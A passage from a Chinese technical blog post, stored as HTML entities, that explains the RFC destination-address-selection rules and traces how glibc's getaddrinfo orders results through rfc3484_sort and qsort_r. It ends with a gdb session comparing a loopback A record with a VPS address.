&#x88AB;&#x5E9F;&#x5F03;&#xFF0C;&#x90A3;&#x4E48;&#x4F18;&#x5148;&#x9009;&#x62E9; DA &#x3002;</li><li>&#x89C4;&#x5219;4&#xFF1A;&#x4F18;&#x5148;&#x9009;&#x62E9;&#x5BB6;&#x5EAD;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C; Source(DA) &#x540C;&#x65F6;&#x662F;&#x5BB6;&#x5EAD;&#x5730;&#x5740;&#x548C;&#x7167;&#x987E;&#x5730;&#x5740;&#xFF0C;&#x800C; Source(DB) &#x4E0D;&#x662F;&#xFF0C;&#x90A3;&#x4E48;&#x9996;&#x9009; DA &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; Source(DB) &#x540C;&#x65F6;&#x662F;&#x5BB6;&#x5EAD;&#x5730;&#x5740;&#x548C;&#x7167;&#x987E;&#x5730;&#x5740;&#xFF0C;&#x800C; Source(DA) &#x4E0D;&#x662F;&#xFF0C;&#x90A3;&#x4E48;&#x9996;&#x9009;DB&#x3002;&#x5982;&#x679C; Source(DA) &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x5BB6;&#x5EAD;&#x5730;&#x5740;&#xFF0C;&#x800C; Source(DB) &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x7167;&#x987E;&#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9009;&#x62E9; DA &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; Source(DA) &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x7167;&#x987E;&#x5730;&#x5740;&#xFF0C;&#x800C; Source(DB) &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x5BB6;&#x5EAD;&#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48;&#x9996;&#x9009; DB &#x3002;</li><li>&#x89C4;&#x5219;5&#xFF1A;&#x4F18;&#x5148;&#x9009;&#x62E9;&#x5339;&#x914D;&#x7684;&#x6807;&#x7B7E;&#x3002;&#x5982;&#x679C; Label(Source(DA))=Label(DA) &#x4E14; Label(Source(DB)) &lt;&gt; Label(DB) &#xFF0C;&#x5219;&#x9996;&#x9009; DA &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; Label(Source(DA)) &lt;&gt;Label(DA) &#xFF0C;&#x4E14;Label(Source(DB))=Label(DB)&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9; DB &#x3002;</li><li>&#x89C4;&#x5219;6&#xFF1A;&#x4F18;&#x5148;&#x9009;&#x62E9;&#x8F83;&#x9AD8;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x3002;&#x5982;&#x679C; Precedence(DA)&gt; Precedence(DB) &#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9; DA &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; Precedence(DA) &lt; Precedence(DB) &#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9; DB &#x3002;</li><li>&#x89C4;&#x5219;7&#xFF1A;&#x4F18;&#x5148;&#x9009;&#x62E9;&#x672C;&#x5730;&#x4F20;&#x8F93;&#x3002;&#x5982;&#x679C; DA &#x662F;&#x901A;&#x8FC7;&#x5C01;&#x88C5;&#x8FC7;&#x6E21;&#x673A;&#x5236;&#xFF08;&#x5982;IPv4&#x4E2D;&#x7684;IPv6&#xFF09;&#x8FBE;&#x5230;&#x7684;&#xFF0C;&#x800C; DB &#x4E0D;&#x662F;&#xFF0C;&#x90A3;&#x4E48;&#x4F18;&#x5148;&#x9009;&#x62E9; DB &#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C; DB &#x662F;&#x901A;&#x8FC7;&#x5C01;&#x88C5;&#x5230;&#x8FBE;&#xFF0C;&#x800C; DA &#x4E0D;&#x662F;&#xFF0C;&#x90A3;&#x4E48;&#x4F18;&#x5148;&#x9009;&#x62E9; DA  &#x3002;</li><li>&#x89C4;&#x5219;8&#xFF1A;&#x4F18;&#x5148;&#x9009;&#x62E9;&#x8F83;&#x5C0F;&#x7684;&#x8303;&#x56F4;&#x3002;&#x5982;&#x679C; Scope(DA) &lt; Scope(DB) &#xFF0C;&#x5219;&#x9996;&#x9009; DA &#x3002;&#x540C;&#x6837;&#xFF0C;&#x5982;&#x679C;Scope(DA)&gt;Scope(DB) &#xFF0C;&#x5219;&#x9009;&#x62E9; DB &#x3002;</li><li>&#x89C4;&#x5219;9&#xFF1A;&#x4F7F;&#x7528;&#x6700;&#x957F;&#x7684;&#x5339;&#x914D;&#x524D;&#x7F00;&#x3002;&#x5F53;DA&#x548C;DB&#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x65CF;&#xFF08;&#x90FD;&#x662F;IPv6&#x6216;&#x90FD;&#x662F;IPv4&#xFF09;&#x3002;&#x5982;&#x679C;CommonPrefixLen(Source(DA), DA) &gt; CommonPrefixLen(Source(DB), DB)&#xFF0C;&#x5219;&#x9996;&#x9009;DA&#x3002;&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C;CommonPrefixLen(Source(DA), DA) &lt; CommonPrefixLen(Source(DB)&#xFF0C;DB)&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9;DB&#x3002;</li><li>&#x89C4;&#x5219;10&#xFF1A;&#x5426;&#x5219;&#xFF0C;&#x4FDD;&#x6301;&#x987A;&#x5E8F;&#x4E0D;&#x53D8;&#x3002;&#x5982;&#x679C;DA&#x5728;&#x539F;&#x5217;&#x8868;&#x4E2D;&#x5148;&#x4E8E;DB&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x9009;&#x62E9;DA&#x3002;&#x5426;&#x5219;&#xFF0C;&#x4F18;&#x5148;&#x9009;&#x62E9;DB&#x3002;</li><li>&#x5982;&#x679C;&#x6267;&#x884C;&#x6709;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x5BF9;&#x76EE;&#x7684;&#x5730;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x89C4;&#x5219;9&#x548C;10&#x53EF;&#x4EE5;&#x88AB;&#x53D6;&#x4EE3;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x5B9E;&#x65BD;&#x673A;&#x6784;&#x77E5;&#x9053;&#x54EA;&#x4E9B;&#x76EE;&#x7684;&#x5730;&#x5740;&#x4F1A;&#x5E26;&#x6765; &#x201C;&#x6700;&#x4F73; &#x201C;&#x7684;&#x901A;&#x4FE1;&#x6027;&#x80FD;&#xFF0C;&#x5219;&#x89C4;&#x5219;9&#x548C;10&#x53EF;&#x4EE5;&#x88AB;&#x53D6;&#x4EE3;&#x3002;</li></ul><p>&#x66F4;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x9075;&#x5B88;&#x4EE5;&#x4E0B;&#x89C4;&#x5219;&#xFF1A;</p><ul><li>&#x907F;&#x514D;&#x4F7F;&#x7528;&#x4E0D;&#x53EF;&#x7528;&#x7684;&#x76EE;&#x7684;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x662F;&#x53EF;&#x5230;&#x8FBE;&#x7684;&#xFF08;&#x5806;&#x6808;&#x6709;&#x901A;&#x5F80;&#x7279;&#x5B9A;&#x5730;&#x5740;&#x7684;&#x8DEF;&#x7531;&#xFF09;&#xFF0C;&#x800C;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x662F;&#x4E0D;&#x53EF;&#x5230;&#x8FBE;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x53EF;&#x5230;&#x8FBE;&#x7684;&#x76EE;&#x7684;&#x5730;&#x5740;&#x653E;&#x5728;&#x4E0D;&#x53EF;&#x5230;&#x8FBE;&#x7684;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;</li><li>&#x4F18;&#x5148;&#x9009;&#x62E9;&#x5339;&#x914D;&#x7684;&#x8303;&#x56F4;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x4E0E;&#x5176;&#x6E90;&#x5730;&#x5740;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x76F8;&#x5339;&#x914D;&#xFF0C;&#x800C;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E0D;&#x7B26;&#x5408;&#x8FD9;&#x4E2A;&#x6807;&#x51C6;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x628A;&#x4F5C;&#x7528;&#x57DF;&#x76F8;&#x5339;&#x914D;&#x7684;&#x5730;&#x5740;&#x653E;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x76EE;&#x7684;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;</li><li>&#x76EE;&#x7684;&#x5730;&#x5740;&#x53CA;&#x5176;&#x76F8;&#x5173;&#x7684;&#x6E90;&#x5730;&#x5740;&#x7684;&#x8303;&#x56F4;&#x7531;&#x5730;&#x5740;&#x7684;&#x9AD8;&#x9636;&#x4F4D;&#x51B3;&#x5B9A;&#x3002;&#x76EE;&#x7684;&#x5730;&#x5740;&#x53EF;&#x4EE5;&#x662F;&#x591A;&#x64AD;&#x5730;&#x5740;&#x6216;&#x5355;&#x64AD;&#x5730;&#x5740;&#x3002;&#x4E3A;&#x4E86;&#x6BD4;&#x8F83;&#x8303;&#x56F4;&#xFF0C;&#x5355;&#x64AD;&#x94FE;&#x8DEF;&#x672C;&#x5730;&#x5730;&#x5740;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x591A;&#x64AD;&#x94FE;&#x8DEF;&#x672C;&#x5730;&#x5730;&#x5740;&#xFF0C;&#x5355;&#x64AD;&#x5168;&#x5C40;&#x5730;&#x5740;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x591A;&#x64AD;&#x5168;&#x5C40;&#x5730;&#x5740;&#x3002;</li><li>&#x907F;&#x514D;&#x4F7F;&#x7528;&#x5E9F;&#x5F03;&#x7684;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x662F;&#x5E9F;&#x5F03;&#x7684;&#xFF0C;&#x800C;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x662F;&#x975E;&#x5E9F;&#x5F03;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x975E;&#x5E9F;&#x5F03;&#x7684;&#x5730;&#x5740;&#x653E;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;</li><li>&#x4F18;&#x5148;&#x9009;&#x62E9;&#x5339;&#x914D;&#x7684;&#x6807;&#x7B7E;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x7684;&#x6807;&#x7B7E;&#x4E0E;&#x5176;&#x5173;&#x8054;&#x7684;&#x6E90;&#x5730;&#x5740;&#x7684;&#x6807;&#x7B7E;&#x76F8;&#x5339;&#x914D;&#xFF0C;&#x800C;&#x53E6;&#x4E00;&#x4E2A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x7684;&#x6807;&#x7B7E;&#x4E0E;&#x5176;&#x5173;&#x8054;&#x7684;&#x6E90;&#x5730;&#x5740;&#x7684;&#x6807;&#x7B7E;&#x4E0D;&#x76F8;&#x5339;&#x914D;&#xFF0C;&#x90A3;&#x4E48;&#x5177;&#x6709;&#x5339;&#x914D;&#x6807;&#x7B7E;&#x7684;&#x76EE;&#x6807;&#x5730;&#x5740;&#x88AB;&#x653E;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;&#x6709;&#x5173;&#x6807;&#x7B7E;&#x5982;&#x4F55;&#x4E0E;&#x76EE;&#x6807;&#x5730;&#x5740;&#x5173;&#x8054;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x89C1;IPv6&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7684;&#x7B56;&#x7565;&#x8868;&#x548C;&#x914D;&#x7F6E;&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7684;&#x7B56;&#x7565;&#x8868;&#x3002;</li><li>&#x4F18;&#x5148;&#x9009;&#x62E9;&#x8F83;&#x9AD8;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x9AD8;&#x4E8E;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x90A3;&#x4E48;&#x4F18;&#x5148;&#x7EA7;&#x8F83;&#x9AD8;&#x7684;&#x5730;&#x5740;&#x5C06;&#x88AB;&#x653E;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;&#x8BF7;&#x53C2;&#x9605; <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6_c_address_policy_table.htm?view=kc" target="_blank" rel="noopener">IPv6&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7684;&#x7B56;&#x7565;&#x8868;</a> &#x548C; <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6_t_configuring_address_policy_table.htm?view=kc" target="_blank" rel="noopener">&#x914D;&#x7F6E;&#x9ED8;&#x8BA4;&#x5730;&#x5740;&#x9009;&#x62E9;&#x7684;&#x7B56;&#x7565;&#x8868;</a>&#xFF0C;&#x4EE5;&#x4E86;&#x89E3;&#x66F4;&#x591A;&#x5173;&#x4E8E;&#x4F18;&#x5148;&#x7EA7;&#x503C;&#x5982;&#x4F55;&#x4E0E;&#x76EE;&#x7684;&#x5730;&#x5740;&#x5173;&#x8054;&#x7684;&#x4FE1;&#x606F;&#x3002;</li><li>&#x4F18;&#x5148;&#x8303;&#x56F4;&#x8F83;&#x5C0F;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x5C0F;&#x4E8E;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5219;&#x4F5C;&#x7528;&#x57DF;&#x8F83;&#x5C0F;&#x7684;&#x5730;&#x5740;&#x653E;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x76EE;&#x7684;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;</li><li>&#x4F7F;&#x7528;&#x6700;&#x957F;&#x7684;&#x5339;&#x914D;&#x524D;&#x7F00;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x4E0E;&#x5176;&#x5173;&#x8054;&#x7684;&#x6E90;&#x5730;&#x5740;&#x7684; CommonPrefixLength &#x6BD4;&#x53E6;&#x4E00;&#x4E2A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x4E0E;&#x5176;&#x6E90;&#x5730;&#x5740;&#x7684; CommonPrefixLength &#x957F;&#xFF0C;&#x90A3;&#x4E48; CommonPrefixLength &#x957F;&#x7684;&#x5730;&#x5740;&#x653E;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4E4B;&#x524D;&#x3002;</li><li>&#x4FDD;&#x6301;&#x987A;&#x5E8F;&#x4E0D;&#x53D8;&#x3002;&#x6CA1;&#x6709;&#x89C4;&#x5219;&#x9009;&#x62E9;&#x8FD9;&#x4E24;&#x4E2A;&#x5730;&#x5740;&#x4E2D;&#x8F83;&#x597D;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5219;&#x5B83;&#x4EEC;&#x9009;&#x62E9;&#x6743;&#x91CD;&#x76F8;&#x7B49;&#x3002;&#x9009;&#x62E9;&#x7B2C;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x8FD9;&#x4E24;&#x4E2A;&#x5730;&#x5740;&#x4E2D;&#x8F83;&#x597D;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x987A;&#x5E8F;&#x4E0D;&#x53D8;&#x3002;</li></ul><p>&#x6211;&#x8BA4;&#x4E3A; RFC &#x51B3;&#x5B9A;&#x4E86;&#x4EE3;&#x7801;<strong>&#x5E94;&#x8BE5;</strong>&#x600E;&#x4E48;&#x53BB;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x7EC8;&#x7A76;&#x8FD8;&#x662F;&#x4EE3;&#x7801;&#x51B3;&#x5B9A;&#x4E86;&#x600E;&#x4E48;&#x53BB;&#x6267;&#x884C;&#x3002;&#xFF08;&#x7EAF;&#x7CB9;&#x662F;&#x6211;&#x4E5F;&#x6CA1;&#x600E;&#x4E48;&#x770B;&#x61C2;</p><p>&#x4E8E;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x627E;&#x5230;<code>getaddrinfo</code>&#x51FD;&#x6570;&#x7684;&#x5B9E;&#x73B0;&#xFF1A;<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479</a> &#xFF0C;&#x5173;&#x952E;&#x70B9;&#x5C31;&#x5728;&#x8FD9;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5728;<code>getaddrinfo</code>&#x51FD;&#x6570;&#x62FF;&#x5230;&#x7ED3;&#x679C;&#x540E;&#x4F7F;&#x7528;&#x4E86;<code>rfc3484_sort</code>&#x5BF9;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* We got all the source addresses we can get, now sort using</span></span><br><span class="line"><span class="hljs-comment">   the information.  */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sort_result_combo</span> <span class="hljs-title">src</span></span></span><br><span class="line"><span class="hljs-class">  = {</span> .results = results, .nresults = nresults };</span><br><span class="line"><span class="hljs-keyword">if</span> (__glibc_unlikely (gaiconf_reload_flag_ever_set))</span><br><span class="line">  {</span><br><span class="line">    __libc_lock_define_initialized (<span class="hljs-keyword">static</span>, lock);</span><br><span class="line">    __libc_lock_lock (lock);</span><br><span class="line">    <span class="hljs-keyword">if</span> (__libc_once_get (old_once) &amp;&amp; gaiconf_reload_flag)</span><br><span class="line">      gaiconf_reload ();</span><br><span class="line">    __qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br><span class="line">    __libc_lock_unlock (lock);</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">  __qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rfc3484_sort</code>&#x51FD;&#x6570;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x5BF9;&#x5E94;&#x4E86; RFC 6742 &#x5F53;&#x4E2D;&#x7684;&#x5341;&#x6761;&#x89C4;&#x5219;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="line">rfc3484_sort (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *p1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *p2, <span class="hljs-keyword">void</span> *arg)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-comment">//...&#x4EE3;&#x7801;&#x6BB5;&#x8FC7;&#x957F;&#x8FD9;&#x91CC;&#x7701;&#x7565;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Rule 10: Otherwise, leave the order unchanged.  To ensure this</span></span><br><span class="line"><span class="hljs-comment">     compare with the value indicating the order in which the entries</span></span><br><span class="line"><span class="hljs-comment">     have been received from the services.  NB: no two entries can have</span></span><br><span class="line"><span class="hljs-comment">     the same order so the test will never return zero.  */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> idx1 &lt; idx2 ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rfc3484_sort</code>&#x7684;&#x51FD;&#x6570;&#x6267;&#x884C;&#x5B8C;&#x540E;&#xFF0C;&#x56DE;&#x8C03;&#x5230;<code>__qsort_r</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>qsort_r</code></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __qsort_r qsort_r</span></span><br><span class="line"></span><br><span class="line">__qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x67E5;&#x9605;&#x624B;&#x518C;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; <a href="https://linux.die.net/man/3/qsort_r" target="_blank" rel="noopener">qsort_r</a> &#x51FD;&#x6570;&#x7684;&#x63CF;&#x8FF0;&#xFF1A;</p><blockquote><p><strong>Synopsis</strong></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">qsort</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> nmemb, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> (*compar)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">qsort_r</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> nmemb, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> (*compar)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">void</span> *),</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">void</span> *arg)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>Feature Test Macro Requirements for glibc (see <strong><a href="https://linux.die.net/man/7/feature_test_macros" target="_blank" rel="noopener">feature_test_macros</a></strong>(7)):</p><ul><li><strong>qsort_r</strong>(): _GNU_SOURCE</li></ul><p><strong>Description</strong></p><p>The <strong>qsort</strong>() function sorts an array with <em>nmemb</em> elements of size <em>size</em>. The <em>base</em> argument points to the start of the array.</p><p>The contents of the array are sorted in ascending order according to a comparison function pointed to by <em>compar</em>, which is called with two arguments that point to the objects being compared.</p><p>The comparison function must return an integer less than, equal to, or greater than zero if the first argument is considered to be respectively less than, equal to, or greater than the second. If two members compare as equal, their order in the sorted array is undefined.</p><p>The <strong>qsort_r</strong>() function is identical to <strong>qsort</strong>() except that the comparison function <em>compar</em> takes a third argument. A pointer is passed to the comparison function via <em>arg</em>. In this way, the comparison function does not need to use global variables to pass through arbitrary arguments, and is therefore reentrant and safe to use in threads.</p></blockquote><p>&#x4ECE;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x660E;&#x767D;&#xFF0C;<code>qsort_r</code> &#x51FD;&#x6570;&#x662F;&#x8FD4;&#x56DE;&#x5347;&#x5E8F;&#x7684;&#x6570;&#x7EC4;&#x7ED3;&#x679C;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x4E8E;&#x4F7F;&#x7528;&#x7684;&#x6BD4;&#x8F83;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#x5426;&#x5927;&#x4E8E;&#x96F6;&#x6765;&#x51B3;&#x5B9A;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x5927;&#x5C0F;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x503C;&#x5927;&#x4E8E;&#x96F6;&#xFF0C;&#x610F;&#x601D;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x9700;&#x8981;&#x6392;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E4B;&#x540E;&#x3002;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x5177;&#x4F53;&#x6765;&#x8C03;&#x8BD5;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5427;&#xFF0C;&#x671F;&#x95F4; setup &#x7B49;&#x8C03;&#x8BD5; glibc &#x5E76;&#x975E;&#x672C;&#x6587;&#x8303;&#x56F4;&#xFF0C;&#x800C;&#x4E14;&#x7F51;&#x7EDC;&#x4E5F;&#x6709;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x505A;&#x8BB0;&#x5F55;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4EE5;&#x4E00;&#x4E2A; A &#x8BB0;&#x5F55;&#x4E3A; 127.0.0.1 &#xFF0C;&#x53E6;&#x4E00;&#x4E2A; A &#x8BB0;&#x5F55;&#x4E3A;&#x6211;&#x5176;&#x4E2D;&#x4E00;&#x4E2A; VPS &#x5730;&#x5740;&#x4E3A;&#x4F8B;&#x5B50;&#xFF0C;&#x5177;&#x4F53;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x4E3B;&#x8981;&#x5224;&#x65AD;&#x5F62;&#x5F0F;&#x3002; gbd &#x76F4;&#x63A5;&#x4E0B;&#x65AD;&#x70B9;&#x5230;<code>rfc3484_sort</code>&#xFF0C;&#x5728;&#x8FDB;&#x5165;&#x5230;&#x51FD;&#x6570;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x5F62;&#x5F0F;&#x67E5;&#x770B;&#x76F8;&#x5E94;&#x7684;&#x5730;&#x5740;&#xFF1A;</p><p></p><figure class="highlight livescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-params">(gdb)</span> <span class="hljs-title">p</span> <span class="hljs-params">((struct sockaddr_in*)((*a1-&gt;dest_addr)-&gt;ai_addr))</span>-&gt;</span>sin_addr</span><br><span class="line">$<span class="hljs-number">3</span> = {s_addr = <span class="hljs-number">3183758381</span>}</span><br><span class="line"><span class="hljs-function"><span class="hljs-params">(gdb)</span> <span class="hljs-title">p</span> <span class="hljs-params">((struct sockaddr_in*)((*a2-&gt;dest_addr)-&gt;ai_addr))</span>-&gt;</span>sin_addr</span><br><span class="line">$<span class="hljs-number">4</span> = {s_addr = <span class="hljs-number">16777343</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F97;&#x5230; a1 &#x4E0E; a2 &#x4EE3;&#x8868;&#x7684;&#x5730;&#x5740;&#x540E;&#xFF0C;&#x8F6C;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x540E;&#x518D;&#x5012;&#x53D9;&#x4E00;&#x4E0B;&#xFF0C;&#x5373; 